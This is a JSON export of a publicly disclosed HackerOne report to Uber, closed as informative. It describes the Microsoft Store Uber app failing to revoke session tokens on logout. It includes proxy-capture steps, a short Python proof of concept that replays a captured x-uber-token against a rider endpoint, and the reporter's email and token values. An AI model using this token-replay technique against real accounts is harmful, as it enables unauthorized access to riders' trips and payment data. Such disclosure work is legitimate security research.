{
  "id": 293363,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTMzNjM=",
  "url": "https://hackerone.com/reports/293363",
  "title": "The Microsoft Store Uber App Does Not Implement Server-side Token Revocation",
  "state": "Closed",
  "substate": "informative",
  "severity_rating": "medium",
  "readable_substate": "Informative",
  "created_at": "2017-11-28T03:54:00.571Z",
  "submitted_at": "2017-11-28T03:54:00.571Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "gregoryvperry",
    "url": "/gregoryvperry",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 314,
    "url": "https://hackerone.com/uber",
    "handle": "uber",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Uber",
      "twitter_handle": "",
      "website": "https://www.uber.com",
      "about": ""
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2017-12-24T20:16:44.836Z",
  "bug_reporter_agreed_on_going_public_at": "2017-11-29T22:07:23.984Z",
  "team_member_agreed_on_going_public_at": "2017-12-24T20:16:44.764Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary\nThe Microsoft Store Uber App (Windows Phone Architecture) does not properly revoke or expire a rider's x-uber-token upon app signout.\n\n## Security Impact\nWhen a user logs out/signs off of the app, the logout process is handled only locally on the application side, and without any type of x-uber-token revocation or expiration at the Uber customer endpoint. This results in the x-uber-token still being active even after a user has logged out, giving an attacker the ability to access and/or modify all aspects of an Uber Rider's (and potentially Driver's) customer information.\n\n## Reproduction Steps\n1. Login using the Microsoft Store Uber App with an interception proxy to capture the session data. Make a note of the issued x-uber-token.\n2. Logout of the Microsoft Store Uber App.\n3. Using the Python POC code below, gain access to the Rider Dispatch View using the x-uber-token issued from Step 1 above:\n\n-----\n\nimport requests\n\nresponse = requests.get(\n    'https://cn-sjc1.uber.com/rt/riders/1ad0f5c1-1ac0-4c2c-a34a-36f267d7ae6f/dispatch-view',\n    headers={                                                                      'accept-encoding': 'gzip, '\n                                                                                              'deflate',\n                                                                           'accept-language': 'en; '\n                                                                                              'q=1.0, '\n                                                                                              'fr; '\n                                                                                              'q=0.9, '\n                                                                                              'de; '\n                                                                                              'q=0.8, '\n                                                                                              'zh-Hans; '\n                                                                                              'q=0.7, '\n                                                                                              'zh-Hant; '\n                                                                                              'q=0.6, '\n                                                                                              'ja; '\n                                                                                              'q=0.5',\n                                                                           'charset': 'utf-8',\n                                                                           'user-agent': 'client/windows-phone/0.0.0.',\n                                                                           'x-uber-client-name': 'client',\n                                                                           'x-uber-client-version': '6.2.8',\n                                                                           'x-uber-device': 'windows-phone',\n                                                                           'x-uber-device-epoch': '1511637222701',\n                                                                           'x-uber-device-language': 'en',\n                                                                           'x-uber-device-location-altitude': '100',\n                                                                           'x-uber-device-location-latitude': '37.4291076516301',\n                                                                           'x-uber-device-location-longitude': '-77.5513191759734',\n                                                                           'x-uber-device-model': 'LENOVO '\n                                                                                                  '80TJ',\n                                                                           'x-uber-device-os': '10.0.16299',\n                                                                           'x-uber-token': '5ead9f1ab28780d48f8caa9d41a22973'}\n)\n\nprint(response.text)\n\n-----\n\n## Specifics\n* GregPerry804@gmail.com was the account used for this attack.\n* All Uber customer endpoints used by the Microsoft Store Uber App will still accept a x-uber-token as valid, after the user has signed off/logged out of their Microsoft Store Uber App session.\n\n## Impact\n\nAn attacker with access to a previously used x-uber-token, even after the user has logged out of the Microsoft Store Uber App, can still modify a rider's profile, access previous trip histories, schedule and/or cancel Uber driver dispatches, and access and/or modify stored payment information.\n\nDriver functionality was not tested. If the Uber Driver role is also implemented within the Microsoft Phone Architecture Uber App, then all functionality encapsulated within the app as relates to driver functionality could be observed and/or modified as well.\n\nGiven the lack of certificate pinning in the Microsoft Store Uber App, this vulnerability is not theoretical and with x-uber-tokens easily harvested at public WiFi hotspots where the app is being used.",
  "weakness": {
    "id": 90,
    "name": "Insufficient Session Expiration"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 3,
  "voters": [
    "fa1rlight",
    "m17hun",
    "gregoryvperry"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
